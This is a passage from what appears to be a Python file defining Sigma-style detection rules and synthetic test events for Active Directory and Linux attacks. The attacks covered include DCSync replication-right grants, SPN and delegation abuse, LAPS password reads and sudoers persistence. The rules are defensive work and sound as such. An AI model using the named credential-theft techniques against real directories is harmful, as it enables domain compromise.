                TargetUserName="Domain Admins",
                MemberName=f"CN={USER_STD},OU=SyntheticUsers,DC=synthetic,DC=invalid",
                SubjectUserName="synthetic-service-iam",
            ),
            case(
                "application_group_removal",
                "Member removed from an application access group.",
                "The privileged group selection does not match.",
                EventID=4729,
                TargetUserName="Synthetic App Users",
                MemberName=f"CN={USER_STD},OU=SyntheticUsers,DC=synthetic,DC=invalid",
                SubjectUserName="synthetic-operator",
            ),
            case(
                "privileged_group_addition",
                "Member added to a privileged group.",
                "The event identifier selection covers removals only.",
                EventID=4728,
                TargetUserName="Domain Admins",
                MemberName=f"CN={USER_STD},OU=SyntheticUsers,DC=synthetic,DC=invalid",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-ID-005",
        family="identity",
        path="identity/windows_security",
        file="password_reset_targeting_privileged_account.yml",
        title="Administrative Password Reset Targeting A Privileged Account",
        level="high",
        profile="win_security",
        desc=(
            "Detects an administrative password reset performed against a privileged synthetic "
            "account. Resetting a privileged credential grants immediate access and locks out "
            "the legitimate owner."
        ),
        hypothesis=(
            "If an adversary takes over a privileged identity, an administrative password reset "
            "will be recorded with a privileged account as the target."
        ),
        techniques=["T1098"],
        refs=[attack_url("T1098"), ms_event(4724)],
        detection=[
            ("selection_admin_reset", [("EventID", 4724)]),
            (
                "selection_privileged_target",
                [("TargetUserName", [USER_ADM, "synthetic-da-admin", "synthetic-breakglass"])],
            ),
        ],
        condition="selection_admin_reset and selection_privileged_target",
        fps=[
            "Scheduled break-glass credential rotation performed by the privileged access "
            "management platform on a documented cadence.",
            "Help desk resets for administrators who have been locked out after a device rebuild "
            "or a lost authenticator.",
        ],
        fp_strategy=(
            "Benign resets follow a rotation schedule or a verified identity proofing step. Tune "
            "by correlating with the rotation schedule and the ticket reference, not by "
            "excluding privileged targets."
        ),
        tuning=(
            "If rotation automation must be excluded, exclude it by subject account and only "
            "during the documented rotation window."
        ),
        test_strategy=(
            "Positive cases reset the administrator and break-glass accounts. Negative cases "
            "reset a standard account, cover a self-service change, and cover an unlock."
        ),
        volume="Very low.",
        related=["SDEL-ID-002", "SDEL-ID-003"],
        pos=[
            case(
                "admin_account_reset",
                "Administrative reset of the synthetic administrator account.",
                "Reset event and privileged target selections both match.",
                EventID=4724,
                SubjectUserName="synthetic-helpdesk",
                TargetUserName=USER_ADM,
            ),
            case(
                "breakglass_account_reset",
                "Administrative reset of the synthetic break-glass account.",
                "Reset event and privileged target selections both match.",
                EventID=4724,
                SubjectUserName="synthetic-operator",
                TargetUserName="synthetic-breakglass",
            ),
        ],
        neg=[
            case(
                "standard_account_reset",
                "Administrative reset of a standard account.",
                "The privileged target selection does not match.",
                EventID=4724,
                SubjectUserName="synthetic-helpdesk",
                TargetUserName=USER_STD,
            ),
            case(
                "self_service_password_change",
                "Administrator changes their own password.",
                "The event identifier is a self-service change, not an administrative reset.",
                EventID=4723,
                SubjectUserName=USER_ADM,
                TargetUserName=USER_ADM,
            ),
            case(
                "account_unlocked",
                "Administrator account unlocked.",
                "The event identifier does not match.",
                EventID=4767,
                SubjectUserName="synthetic-helpdesk",
                TargetUserName=USER_ADM,
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-ID-006",
        family="identity",
        path="identity/active_directory",
        file="service_principal_name_attribute_changed.yml",
        title="Service Principal Name Attribute Changed On A Directory Object",
        level="medium",
        profile="win_security",
        desc=(
            "Detects modification of the service principal name attribute on a directory object. "
            "Adding a service principal name to an ordinary user account makes that account's "
            "credential material requestable by any authenticated principal."
        ),
        hypothesis=(
            "If an account is prepared for credential harvesting from service tickets, the "
            "directory service change audit will record a service principal name attribute "
            "write."
        ),
        techniques=["T1098"],
        extra_techniques=["T1558.003"],
        refs=[attack_url("T1098"), attack_url("T1558.003"), ms_event(5136), MS_SPN],
        detection=[
            ("selection_directory_change", [("EventID", 5136)]),
            ("selection_spn_attribute", [("AttributeLDAPDisplayName", "servicePrincipalName")]),
            ("selection_value_written", [("OperationType", ["Value Added", "%%14674"])]),
        ],
        condition=(
            "selection_directory_change and selection_spn_attribute and selection_value_written"
        ),
        fps=[
            "Application onboarding that registers service principal names for a newly created "
            "service account during a documented deployment.",
            "Database cluster failover procedures that re-register service principal names for "
            "the listener account.",
        ],
        fp_strategy=(
            "Benign writes target dedicated service accounts and coincide with deployments. The "
            "high-value case is a service principal name written onto an interactive user "
            "account, so tune on the object class of the target."
        ),
        tuning=(
            "Enrich with the target object type and suppress only writes against known service "
            "accounts in the service account organisational unit."
        ),
        test_strategy=(
            "Positive cases write the attribute on a user object and on an administrative "
            "account. Negative cases delete the value, write a different attribute, and use a "
            "different event identifier."
        ),
        volume="Low.",
        related=["SDEL-ID-007", "SDEL-ID-008"],
        pos=[
            case(
                "spn_added_to_user",
                "Service principal name added to a standard user object.",
                "All three selections match.",
                EventID=5136,
                ObjectDN=f"CN={USER_STD},OU=SyntheticUsers,DC=synthetic,DC=invalid",
                AttributeLDAPDisplayName="servicePrincipalName",
                AttributeValue="SYNTHETIC/synthetic-host-01.synthetic.invalid",
                OperationType="Value Added",
                SubjectUserName=USER_ADM,
            ),
            case(
                "spn_added_to_admin",
                "Service principal name added to an administrative account.",
                "All three selections match.",
                EventID=5136,
                ObjectDN=f"CN={USER_ADM},OU=SyntheticAdmins,DC=synthetic,DC=invalid",
                AttributeLDAPDisplayName="servicePrincipalName",
                AttributeValue="SYNTHETIC/synthetic-dc01.synthetic.invalid",
                OperationType="Value Added",
                SubjectUserName="synthetic-operator",
            ),
        ],
        neg=[
            case(
                "spn_value_deleted",
                "Service principal name removed during decommissioning.",
                "The operation type selection does not match a deletion.",
                EventID=5136,
                ObjectDN=f"CN={USER_SVC},OU=SyntheticServices,DC=synthetic,DC=invalid",
                AttributeLDAPDisplayName="servicePrincipalName",
                OperationType="Value Deleted",
            ),
            case(
                "description_attribute_changed",
                "Description attribute updated on a user object.",
                "The attribute selection does not match.",
                EventID=5136,
                ObjectDN=f"CN={USER_STD},OU=SyntheticUsers,DC=synthetic,DC=invalid",
                AttributeLDAPDisplayName="description",
                AttributeValue="Synthetic test account",
                OperationType="Value Added",
            ),
            case(
                "user_account_changed_event",
                "Account change summary event raised for the same user.",
                "The event identifier selection does not match.",
                EventID=4738,
                TargetUserName=USER_STD,
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-ID-007",
        family="identity",
        path="identity/active_directory",
        file="delegation_attribute_modified.yml",
        title="Kerberos Delegation Attribute Modified On A Directory Object",
        level="high",
        profile="win_security",
        desc=(
            "Detects changes to constrained or resource-based delegation attributes. Delegation "
            "settings let one principal request service tickets on behalf of another, so an "
            "unexpected change is a serious escalation path."
        ),
        hypothesis=(
            "If delegation is abused for impersonation, a directory service change audit record "
            "will show a write to one of the delegation attributes."
        ),
        techniques=["T1098"],
        refs=[attack_url("T1098"), ms_event(5136), MS_DELEG],
        detection=[
            ("selection_directory_change", [("EventID", 5136)]),
            (
                "selection_delegation_attribute",
                [
                    (
                        "AttributeLDAPDisplayName",
                        [
                            "msDS-AllowedToDelegateTo",
                            "msDS-AllowedToActOnBehalfOfOtherIdentity",
                        ],
                    )
                ],
            ),
        ],
        condition="selection_directory_change and selection_delegation_attribute",
        fps=[
            "Application server deployments that configure constrained delegation for a web "
            "front-end to reach a back-end database service.",
            "Cluster reconfiguration that updates resource-based delegation when a node is "
            "replaced.",
        ],
        fp_strategy=(
            "Benign changes accompany documented application deployments and target service "
            "accounts. Tune by requiring a change record and by monitoring which principals are "
            "added to the delegation list."
        ),
        tuning=(
            "Do not exclude the attributes themselves. If noise is high, restrict alerting to "
            "objects outside the approved service account organisational unit."
        ),
        test_strategy=(
            "Positive cases modify both delegation attributes. Negative cases modify an "
            "unrelated attribute, use a different event identifier, and read the attribute."
        ),
        volume="Very low.",
        related=["SDEL-ID-006", "SDEL-ID-008"],
        pos=[
            case(
                "constrained_delegation_set",
                "Constrained delegation target list modified on a service account.",
                "Directory change and delegation attribute selections both match.",
                EventID=5136,
                ObjectDN=f"CN={USER_SVC},OU=SyntheticServices,DC=synthetic,DC=invalid",
                AttributeLDAPDisplayName="msDS-AllowedToDelegateTo",
                AttributeValue="SYNTHETIC/synthetic-dc01.synthetic.invalid",
                OperationType="Value Added",
            ),
            case(
                "resource_based_delegation_set",
                "Resource-based delegation descriptor written on a computer object.",
                "Directory change and delegation attribute selections both match.",
                EventID=5136,
                ObjectDN=f"CN={HOST_WIN},OU=SyntheticComputers,DC=synthetic,DC=invalid",
                AttributeLDAPDisplayName="msDS-AllowedToActOnBehalfOfOtherIdentity",
                AttributeValue="SYNTHETIC-SECURITY-DESCRIPTOR-PLACEHOLDER",
                OperationType="Value Added",
            ),
        ],
        neg=[
            case(
                "display_name_changed",
                "Display name updated on a service account.",
                "The delegation attribute selection does not match.",
                EventID=5136,
                ObjectDN=f"CN={USER_SVC},OU=SyntheticServices,DC=synthetic,DC=invalid",
                AttributeLDAPDisplayName="displayName",
                AttributeValue="Synthetic Service",
                OperationType="Value Added",
            ),
            case(
                "computer_account_changed_summary",
                "Computer account change summary event.",
                "The event identifier selection does not match.",
                EventID=4742,
                TargetUserName=f"{HOST_WIN}$",
            ),
            case(
                "directory_object_read",
                "Directory object attribute read during an access review.",
                "The event identifier selection does not match a read operation.",
                EventID=4662,
                ObjectDN=f"CN={USER_SVC},OU=SyntheticServices,DC=synthetic,DC=invalid",
                Properties="msDS-AllowedToDelegateTo",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-ID-008",
        family="identity",
        path="identity/active_directory",
        file="directory_replication_rights_granted.yml",
        title="Directory Replication Rights Granted On The Domain Object",
        level="critical",
        profile="win_security",
        desc=(
            "Detects a security descriptor change on the domain object that grants directory "
            "replication rights. This rule is rated critical because those rights allow a "
            "principal to request the replication of secret attributes for every account in the "
            "domain, the benign population is essentially limited to domain controller "
            "promotion, and the required response is immediate containment of the granted "
            "principal."
        ),
        hypothesis=(
            "If an adversary prepares domain-wide credential replication, the domain object "
            "security descriptor will be modified to include a replication control access right."
        ),
        techniques=["T1003.006"],
        refs=[attack_url("T1003.006"), ms_event(5136), MS_ADREPL],
        detection=[
            ("selection_directory_change", [("EventID", 5136)]),
            ("selection_security_descriptor", [("AttributeLDAPDisplayName", "nTSecurityDescriptor")]),
            (
                "selection_replication_right",
                [
                    (
                        "AttributeValue|contains",
                        [
                            "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
                            "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
                            "DS-Replication-Get-Changes",
                        ],
                    )
                ],
            ),
        ],
        condition=(
            "selection_directory_change and selection_security_descriptor "
            "and selection_replication_right"
        ),
        fps=[
            "Domain controller promotion, which legitimately grants replication rights to the "
            "new controller computer object during the promotion sequence.",
            "Directory synchronisation connector installation for an approved identity "
            "synchronisation product, performed once per connector server.",
        ],
        fp_strategy=(
            "The benign population is limited to controller promotion and connector "
            "installation, both of which are planned and rare. Verify the granted principal "
            "against the domain controllers group and the connector account inventory."
        ),
        tuning=(
            "Do not create standing exclusions. Instead, suppress during a documented promotion "
            "window and require the granted principal to be reviewed afterwards."
        ),
        test_strategy=(
            "Positive cases grant each of the two replication control access rights. Negative "
            "cases modify the descriptor without a replication right, modify another attribute, "
            "and read the descriptor."
        ),
        volume="Rare; expected only during planned directory changes.",
        related=["SDEL-WIN-012", "SDEL-ID-007"],
        pos=[
            case(
                "get_changes_granted",
                "Replication read right granted to a synthetic principal.",
                "All three selections match.",
                EventID=5136,
                ObjectDN="DC=synthetic,DC=invalid",
                AttributeLDAPDisplayName="nTSecurityDescriptor",
                AttributeValue=(
                    "SYNTHETIC-SDDL-PLACEHOLDER;ObjectType=1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;"
                    f"Trustee={USER_STD}"
                ),
                OperationType="Value Added",
                SubjectUserName="synthetic-operator",
            ),
            case(
                "get_changes_all_granted",
                "Extended replication right granted to a synthetic principal.",
                "All three selections match.",
                EventID=5136,
                ObjectDN="DC=synthetic,DC=invalid",
                AttributeLDAPDisplayName="nTSecurityDescriptor",
                AttributeValue=(
                    "SYNTHETIC-SDDL-PLACEHOLDER;ObjectType=1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;"
                    f"Trustee={USER_SVC}"
                ),
                OperationType="Value Added",
                SubjectUserName="synthetic-operator",
            ),
        ],
        neg=[
            case(
                "descriptor_change_without_replication_right",
                "Domain object descriptor updated with an unrelated right.",
                "The replication right selection does not match.",
                EventID=5136,
                ObjectDN="DC=synthetic,DC=invalid",
                AttributeLDAPDisplayName="nTSecurityDescriptor",
                AttributeValue="SYNTHETIC-SDDL-PLACEHOLDER;ObjectType=SyntheticReadProperty",
                OperationType="Value Added",
            ),
            case(
                "organisational_unit_attribute_change",
                "Organisational unit description updated.",
                "The security descriptor attribute selection does not match.",
                EventID=5136,
                ObjectDN="OU=SyntheticUsers,DC=synthetic,DC=invalid",
                AttributeLDAPDisplayName="description",
                AttributeValue="Synthetic user container",
                OperationType="Value Added",
            ),
            case(
                "descriptor_read",
                "Domain object security descriptor read during an audit.",
                "The event identifier selection does not match a read operation.",
                EventID=4662,
                ObjectDN="DC=synthetic,DC=invalid",
                Properties="nTSecurityDescriptor",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-ID-009",
        family="identity",
        path="identity/active_directory",
        file="group_policy_object_modified.yml",
        title="Group Policy Object Modified In The Policies Container",
        level="medium",
        profile="win_security",
        desc=(
            "Detects modification of an object inside the group policy container. Group policy "
            "is a domain-wide configuration and code distribution channel, so unplanned changes "
            "deserve review."
        ),
        hypothesis=(
            "If group policy is used to distribute configuration or execution, the directory "
            "change audit will record a write against an object in the policies container."
        ),
        techniques=["T1484.001"],
        refs=[attack_url("T1484.001"), ms_event(5136), MS_GPO],
        detection=[
            ("selection_directory_change", [("EventID", 5136)]),
            ("selection_policy_container", [("ObjectDN|contains", "CN=Policies,CN=System")]),
            ("selection_value_written", [("OperationType", ["Value Added", "%%14674"])]),
        ],
        condition=(
            "selection_directory_change and selection_policy_container and selection_value_written"
        ),
        fps=[
            "Planned policy edits by the platform team during a change window, typically "
            "clustered within a short period on the same policy object.",
            "Configuration baseline tooling that updates a managed policy version stamp on a "
            "regular schedule.",
        ],
        fp_strategy=(
            "Benign edits come from a known set of policy administrators and correspond to "
            "change tickets. Tune by correlating with the change calendar and by watching for "
            "edits to policies linked at the domain root."
        ),
        tuning=(
            "Exclude the baseline tooling service account if its version stamp updates dominate "
            "the volume. Keep human-initiated edits visible at all times."
        ),
        test_strategy=(
            "Positive cases modify version and file path attributes on policy objects. Negative "
            "cases modify an object outside the container, delete a value, and read the object."
        ),
        volume="Low; a handful of matches per change window.",
        related=["SDEL-ID-011"],
        pos=[
            case(
                "policy_version_updated",
                "Policy version attribute updated on a policy object.",
                "All three selections match.",
                EventID=5136,
                ObjectDN=(
                    "CN={00000000-0000-0000-0000-00000000abcd},CN=Policies,CN=System,"
                    "DC=synthetic,DC=invalid"
                ),
                AttributeLDAPDisplayName="versionNumber",
                AttributeValue="42",
                OperationType="Value Added",
                SubjectUserName=USER_ADM,
            ),
            case(
                "policy_file_path_updated",
                "Policy file path attribute updated on a policy object.",
                "All three selections match.",
                EventID=5136,
                ObjectDN=(
                    "CN={00000000-0000-0000-0000-00000000beef},CN=Policies,CN=System,"
                    "DC=synthetic,DC=invalid"
                ),
                AttributeLDAPDisplayName="gPCFileSysPath",
                AttributeValue=(
                    "\\\\synthetic.invalid\\SysVol\\synthetic.invalid\\Policies\\"
                    "{00000000-0000-0000-0000-00000000beef}"
                ),
                OperationType="Value Added",
                SubjectUserName="synthetic-operator",
            ),
        ],
        neg=[
            case(
                "user_object_modified",
                "User object attribute modified outside the policies container.",
                "The policy container selection does not match.",
                EventID=5136,
                ObjectDN=f"CN={USER_STD},OU=SyntheticUsers,DC=synthetic,DC=invalid",
                AttributeLDAPDisplayName="description",
                OperationType="Value Added",
            ),
            case(
                "policy_value_deleted",
                "Value removed from a policy object.",
                "The operation type selection does not match a deletion.",
                EventID=5136,
                ObjectDN=(
                    "CN={00000000-0000-0000-0000-00000000abcd},CN=Policies,CN=System,"
                    "DC=synthetic,DC=invalid"
                ),
                AttributeLDAPDisplayName="gPCMachineExtensionNames",
                OperationType="Value Deleted",
            ),
            case(
                "policy_object_read",
                "Policy object read during a configuration report.",
                "The event identifier selection does not match a read operation.",
                EventID=4662,
                ObjectDN=(
                    "CN={00000000-0000-0000-0000-00000000abcd},CN=Policies,CN=System,"
                    "DC=synthetic,DC=invalid"
                ),
                Properties="versionNumber",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-ID-010",
        family="identity",
        path="identity/active_directory",
        file="domain_trust_created_or_modified.yml",
        title="Domain Trust Relationship Created Or Modified",
        level="high",
        profile="win_security",
        desc=(
            "Detects creation, modification, or removal of a domain trust relationship. Trusts "
            "extend the authentication boundary, so an unexpected trust change can silently "
            "widen the set of principals that can authenticate into the domain."
        ),
        hypothesis=(
            "If the authentication boundary is altered, the Security log on a domain controller "
            "will record one of the trust lifecycle audit events."
        ),
        techniques=["T1484.002"],
        refs=[attack_url("T1484.002"), ms_event(4706), MS_TRUST],
        detection=[
            ("selection_trust_lifecycle", [("EventID", [4706, 4707, 4716, 4865, 4866, 4867])]),
        ],
        condition="selection_trust_lifecycle",
        fps=[
            "Merger and acquisition integration projects that establish a forest trust during a "
            "planned migration phase.",
            "Test directory rebuilds where a lab trust is torn down and recreated as part of the "
            "environment refresh.",
        ],
        fp_strategy=(
            "Trust changes are rare and always planned in a healthy environment. Treat every "
            "match as reviewable and correlate with the migration project record rather than "
            "excluding events."
        ),
        tuning=(
            "Do not exclude trust events. If a migration produces repeated events, suppress only "
            "for the duration of the documented migration window."
        ),
        test_strategy=(
            "Positive cases create and modify a trust. Negative cases cover a group change, a "
            "logon, and a policy change on the same controller."
        ),
        volume="Rare.",
        related=["SDEL-ID-009"],
        pos=[
            case(
                "trust_created",
                "New domain trust created.",
                "The trust lifecycle selection matches.",
                EventID=4706,
                TargetUserName="synthetic-partner.invalid",
                SubjectUserName=USER_ADM,
            ),
            case(
                "trust_modified",
                "Existing trust information modified.",
                "The trust lifecycle selection matches.",
                EventID=4716,
                TargetUserName="synthetic-partner.invalid",
                SubjectUserName="synthetic-operator",
            ),
        ],
        neg=[
            case(
                "group_membership_change",
                "Group membership change on the same controller.",
                "The event identifier selection does not match.",
                EventID=4728,
                TargetUserName="Domain Admins",
            ),
            case(
                "successful_logon",
                "Ordinary network logon on the controller.",
                "The event identifier selection does not match.",
                EventID=4624,
                TargetUserName=USER_STD,
            ),
            case(
                "audit_policy_change",
                "Audit policy change on the controller.",
                "The event identifier selection does not match.",
                EventID=4719,
                SubjectUserName=USER_ADM,
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-ID-011",
        family="identity",
        path="identity/windows_security",
        file="audit_policy_weakened.yml",
        title="Audit Policy Subcategory Weakened",
        level="high",
        profile="win_security",
        desc=(
            "Detects audit policy changes that remove success or failure auditing from a "
            "subcategory. Removing auditing blinds every downstream detection that depends on "
            "the affected event family."
        ),
        hypothesis=(
            "If telemetry is being suppressed at the source, the audit policy change event will "
            "record that success or failure auditing was removed from a subcategory."
        ),
        techniques=["T1685"],
        refs=[attack_url("T1685"), ms_event(4719), MS_AUDITPOL],
        detection=[
            ("selection_audit_policy_change", [("EventID", 4719)]),
            (
                "selection_auditing_removed",
                [("AuditPolicyChanges|contains", ["Success removed", "Failure removed", "%%8448", "%%8450"])],
            ),
        ],
        condition="selection_audit_policy_change and selection_auditing_removed",
        fps=[
            "Baseline hardening projects that intentionally reduce noisy subcategories such as "
            "filtering platform connection auditing.",
            "Domain controller performance remediation where a high-volume subcategory is "
            "temporarily reduced under a change record.",
        ],
        fp_strategy=(
            "Benign matches are planned, documented, and target specific noisy subcategories. "
            "Tune by listing the subcategories that the baseline project is allowed to reduce."
        ),
        tuning=(
            "Never exclude the account logon or account management subcategories. Restrict any "
            "exclusion to the specific low-value subcategory named in the change record."
        ),
        test_strategy=(
            "Positive cases remove success auditing and failure auditing. Negative cases add "
            "auditing, use a different event identifier, and change a policy setting unrelated "
            "to auditing."
        ),
        volume="Very low.",
        related=["SDEL-WIN-010", "SDEL-ID-009"],
        pos=[
            case(
                "success_auditing_removed",
                "Success auditing removed from an account management subcategory.",
                "Audit policy change and removal selections both match.",
                EventID=4719,
                SubjectUserName=USER_ADM,
                CategoryId="Account Management",
                SubcategoryId="User Account Management",
                AuditPolicyChanges="Success removed",
            ),
            case(
                "failure_auditing_removed",
                "Failure auditing removed from a logon subcategory.",
                "Audit policy change and removal selections both match.",
                EventID=4719,
                SubjectUserName="synthetic-operator",
                CategoryId="Logon/Logoff",
                SubcategoryId="Logon",
                AuditPolicyChanges="Failure removed",
            ),
        ],
        neg=[
            case(
                "success_auditing_added",
                "Success auditing added to a subcategory during hardening.",
                "The removal selection does not match.",
                EventID=4719,
                SubjectUserName=USER_ADM,
                SubcategoryId="Process Creation",
                AuditPolicyChanges="Success added",
            ),
            case(
                "security_log_cleared",
                "Security log cleared on the same host.",
                "The event identifier selection does not match.",
                EventID=1102,
                SubjectUserName=USER_ADM,
            ),
            case(
                "system_time_changed",
                "System time changed on the host.",
                "The event identifier selection does not match.",
                EventID=4616,
                SubjectUserName=USER_SVC,
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-ID-012",
        family="identity",
        path="identity/active_directory",
        file="laps_password_attribute_read.yml",
        title="Local Administrator Password Solution Attribute Read",
        level="low",
        profile="win_security",
        desc=(
            "Detects directory object access that reads the managed local administrator password "
            "attribute. Reads are legitimate for help desk staff, so the rule is intended for "
            "review of who reads which computer objects and how often."
        ),
        hypothesis=(
            "If managed local administrator credentials are harvested, the directory access "
            "audit will record reads of the password attribute on computer objects."
        ),
        techniques=["T1555"],
        refs=[attack_url("T1555"), ms_event(4662), MS_LAPS],
        detection=[
            ("selection_object_access", [("EventID", 4662)]),
            (
                "selection_password_attribute",
                [("Properties|contains", ["ms-Mcs-AdmPwd", "msLAPS-Password", "msLAPS-EncryptedPassword"])],
            ),
        ],
        condition="selection_object_access and selection_password_attribute",
        fps=[
            "Help desk staff retrieving the managed local administrator password to support a "
            "user during an approved remote assistance session.",
            "Endpoint management tooling reading the attribute to validate password rotation "
            "compliance across the fleet.",
        ],
        fp_strategy=(
            "Reads by help desk staff are expected. The reviewable pattern is a single principal "
            "reading many computer objects in a short period, so correlate on read volume per "
            "subject."
        ),
        tuning=(
            "Enrich with the subject role and the number of distinct computer objects read. "
            "Avoid excluding the help desk group, since bulk reads by that group are exactly the "
            "case worth reviewing."
        ),
        test_strategy=(
            "Positive cases read the legacy and current password attributes. Negative cases read "
            "an unrelated attribute, write the attribute, and use a different event identifier."
        ),
        volume="Moderate in environments with active help desk usage.",
        related=["SDEL-ID-008"],
        pos=[
            case(
                "legacy_attribute_read",
                "Legacy managed password attribute read on a computer object.",
                "Object access and password attribute selections both match.",
                EventID=4662,
                ObjectDN=f"CN={HOST_WIN},OU=SyntheticComputers,DC=synthetic,DC=invalid",
                Properties="ms-Mcs-AdmPwd",
                SubjectUserName="synthetic-helpdesk",
            ),
            case(
                "current_attribute_read",
                "Current managed password attribute read on a computer object.",
                "Object access and password attribute selections both match.",
                EventID=4662,
                ObjectDN=f"CN={HOST_WIN},OU=SyntheticComputers,DC=synthetic,DC=invalid",
                Properties="msLAPS-Password",
                SubjectUserName="synthetic-operator",
            ),
        ],
        neg=[
            case(
                "computer_description_read",
                "Computer object description read during inventory.",
                "The password attribute selection does not match.",
                EventID=4662,
                ObjectDN=f"CN={HOST_WIN},OU=SyntheticComputers,DC=synthetic,DC=invalid",
                Properties="description",
                SubjectUserName=USER_SVC,
            ),
            case(
                "password_attribute_written",
                "Managed password attribute written by the endpoint during rotation.",
                "The event identifier selection covers reads, not directory changes.",
                EventID=5136,
                ObjectDN=f"CN={HOST_WIN},OU=SyntheticComputers,DC=synthetic,DC=invalid",
                AttributeLDAPDisplayName="msLAPS-Password",
                OperationType="Value Added",
            ),
            case(
                "group_object_read",
                "Group object read during an access review.",
                "The password attribute selection does not match.",
                EventID=4662,
                ObjectDN="CN=Domain Admins,CN=Users,DC=synthetic,DC=invalid",
                Properties="member",
            ),
        ],
    )
)

# ---------------------------------------------------------------- LINUX (12)

RULES.append(
    rule(
        cid="SDEL-LX-001",
        family="linux",
        path="linux/authentication",
        file="local_user_account_created.yml",
        title="Local User Account Created On A Linux Host",
        level="low",
        profile="linux_auth",
        desc=(
            "Detects local account creation on a Linux host. Server fleets normally use "
            "centralised identity, so a local account is worth noticing even though build "
            "automation creates them legitimately."
        ),
        hypothesis=(
            "If a local foothold identity is created, the authentication log will contain a user "
            "creation message from the account management utility."
        ),
        techniques=["T1136.001"],
        refs=[attack_url("T1136.001"), MAN_USERADD],
        detection=[
            ("selection_account_tool", [("ProcessName", ["useradd", "adduser"])]),
            ("selection_creation_message", [("Message|contains", ["new user:", "new group:"])]),
        ],
        condition="selection_account_tool and selection_creation_message",
        fps=[
            "Configuration management runs that create application service accounts during "
            "server provisioning.",
            "Container image build steps that create an unprivileged runtime user before "
            "dropping privileges.",
            "Package installation that creates a dedicated system account for a newly installed "
            "daemon.",
        ],
        fp_strategy=(
            "Provisioning dominates the benign population. Tune by correlating with the "
            "configuration management run identifier and by treating accounts with a login shell "
            "and a home directory as higher interest."
        ),
        tuning=(
            "Do not exclude the account management utility. Prefer enrichment with the created "
            "shell and the parent process so that interactive accounts stand out."
        ),
        test_strategy=(
            "Positive cases create a user through each utility name. Negative cases delete a "
            "user, modify a user, and record an ordinary session open."
        ),
        volume="Low.",
        related=["SDEL-LX-002"],
        pos=[
            case(
                "useradd_new_user",
                "Account management utility creates a new user.",
                "Tool and creation message selections both match.",
                ProcessName="useradd",
                Message=(
                    "new user: name=synthetic-newuser, UID=1050, GID=1050, "
                    "home=/home/synthetic-newuser, shell=/bin/bash"
                ),
                User=USER_ADM,
            ),
            case(
                "adduser_new_user",
                "Interactive wrapper creates a new user.",
                "Tool and creation message selections both match.",
                ProcessName="adduser",
                Message="new user: name=synthetic-contractor, UID=1051, GID=1051, shell=/bin/sh",
                User=USER_ADM,
            ),
        ],
        neg=[
            case(
                "userdel_removes_user",
                "Account removed during decommissioning.",
                "The creation message selection does not match.",
                ProcessName="userdel",
                Message="delete user 'synthetic-leaver'",
                User=USER_ADM,
            ),
            case(
                "usermod_changes_shell",
                "Existing account modified.",
                "Neither selection matches.",
                ProcessName="usermod",
                Message="change user 'synthetic-user' shell from /bin/sh to /bin/bash",
            ),
            case(
                "session_opened",
                "Ordinary session opened for an existing user.",
                "Neither selection matches.",
                ProcessName="sshd",
                Message=f"pam_unix(sshd:session): session opened for user {USER_STD}",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-LX-002",
        family="linux",
        path="linux/persistence",
        file="sudoers_configuration_modified.yml",
        title="Sudoers Configuration File Modified",
        level="high",
        profile="linux_file_event",
        desc=(
            "Detects writes to the privilege escalation configuration file or its include "
            "directory. A single line in these files can grant permanent passwordless root "
            "access."
        ),
        hypothesis=(
            "If persistent privilege escalation is configured, a file write will be recorded "
            "against the sudoers file or its include directory."
        ),
        techniques=["T1548.003"],
        refs=[attack_url("T1548.003"), MAN_SUDOERS],
        detection=[
            (
                "selection_sudoers_path",
                [("TargetFilename|startswith", ["/etc/sudoers", "/etc/sudoers.d/"])],
            ),
            ("filter_package_manager", [("Image", ["/usr/bin/dpkg", "/usr/bin/rpm"])]),
        ],
        condition="selection_sudoers_path and not filter_package_manager",
        fps=[
            "Configuration management applying an approved privilege template to a server role, "
            "which appears as a write to a file in the include directory.",
            "Package installation that ships its own privilege fragment, which the package "
            "manager filter removes.",
        ],
        fp_strategy=(
            "Benign writes come from configuration management and packaging. Tune on the writing "
            "process image and require that the resulting content is reviewed, not just the "
            "write event."
        ),
        tuning=(
            "Exclude the configuration management agent by absolute path if needed. Never "
            "exclude the include directory, which is where ad hoc grants are usually placed."
        ),
        test_strategy=(
            "Positive cases write the main file and an include fragment. Negative cases write an "
            "unrelated configuration file, use the package manager, and write a backup outside "
            "the directory."
        ),
        volume="Very low.",
        related=["SDEL-LX-001", "SDEL-LX-008"],
        pos=[
            case(
                "main_sudoers_written",
                "Main privilege configuration file written by an editor.",
                "Path selection matches and the package manager filter does not apply.",
                TargetFilename="/etc/sudoers",
                Image="/usr/bin/vim",
                User=USER_ADM,
            ),
            case(
                "include_fragment_written",
                "Privilege fragment written into the include directory.",
                "Path selection matches and the package manager filter does not apply.",
                TargetFilename="/etc/sudoers.d/synthetic-grant",
                Image="/usr/bin/tee",
                User=USER_ADM,
            ),
        ],
        neg=[
            case(
                "unrelated_configuration_file",
                "Unrelated system configuration file written.",
                "The path selection does not match.",
                TargetFilename="/etc/synthetic-example.conf",
                Image="/usr/bin/vim",
            ),
            case(
                "package_manager_fragment",
                "Package manager installs its own privilege fragment.",
                "Path matches but the package manager filter removes the event.",
                TargetFilename="/etc/sudoers.d/synthetic-package",
                Image="/usr/bin/dpkg",
            ),
            case(
                "backup_copy_outside_directory",
                "Backup copy of the configuration written elsewhere.",
                "The startswith path selection does not match a backup directory.",
                TargetFilename="/var/backups/sudoers.bak",
                Image="/usr/bin/cp",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-LX-003",
        family="linux",
        path="linux/persistence",
        file="cron_persistence_entry_created.yml",
        title="Cron Persistence Entry Created",
        level="medium",
        profile="linux_file_event",
        desc=(
            "Detects writes to the scheduling directories used by the time-based job scheduler. "
            "Scheduled jobs are a durable and low-effort persistence mechanism on Linux hosts."
        ),
        hypothesis=(
            "If time-based persistence is installed, a write will be recorded against a system "
